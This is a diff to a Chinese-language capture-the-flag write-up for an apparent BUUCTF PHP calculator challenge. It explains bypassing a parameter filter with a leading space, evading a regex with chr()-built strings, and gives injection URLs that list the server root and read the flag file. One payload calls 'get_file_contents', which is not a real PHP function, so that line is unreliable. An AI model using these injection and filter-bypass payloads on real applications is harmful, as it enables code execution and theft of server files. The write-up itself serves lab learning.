@@ -175,5 +175,14 @@ PHP需要将所有参数转换为有效的变量名，因此在解析查询字�
 
 2.将某些字符转换为下划线（包括空格）
 ```
-在变量前加空格进行
+在变量前加空格进行对仅数字限制的绕过，其将会把‘ num’与‘num’视为一个变量。且不会限制‘ num’的值，因为他限制的是‘num’，后面的payload前都加空格。
 正则了很多，字符异或拼接不起作用，其正则了’^‘.使用chr()函数，将ASCII码转为字符再拼接进行绕过。
+var_dump(scandir(/))
+var_dump(get_file_contents())
+构造payload:
+```http://node4.buuoj.cn:25481/calc.php? num=1;var_dump(scandir(chr(47)))```
+发现其有f1agg文件
+构造payload:
+```http://node4.buuoj.cn:25481/calc.php? num=1;var_dump(get_file_contents(chr(47).f1agg))```
+chr(47).f1agg，即：/f1agg
+取得flag.
